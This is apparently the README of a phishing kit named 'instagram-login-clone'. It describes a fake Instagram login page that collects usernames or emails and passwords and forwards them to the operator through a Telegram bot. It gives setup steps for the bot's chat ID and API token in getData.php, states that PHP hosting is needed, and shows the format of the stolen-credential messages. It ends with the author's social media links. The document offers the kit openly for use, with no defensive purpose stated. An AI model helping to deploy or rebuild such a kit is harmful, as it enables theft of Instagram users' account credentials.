# instagram-login-clone

An Instagram phishing page which collects user/email + password and sends it to via Telegram bot

Setting up  ``getData.php``

``$chat_id= xxxxxxxx;`` your userid 

``$apiToken = "XxXXXxxxXxxxXXxxxX";`` Telegram Bot Api Token

Done

**PHP supported hosting required to host this phishing page**

## Format of Message sent by the bot
Username : ``xxxxxxxx``

Password: ``xxxxxxxx``

Tried Login at ``00:00 IST``

### Note
This Phishing page is only designed for mobile web browser not for desktop (non-responsive)

Will Try to release a reponsive version soon

# Reboot13

Telegram : [@reboot13](https://telegram.me/reboot13)

Youtube: [Krutik Raut](https://youtube.com/krutikraut)

Blog: [@reboot13](https://hashnode.com/@reboot13)
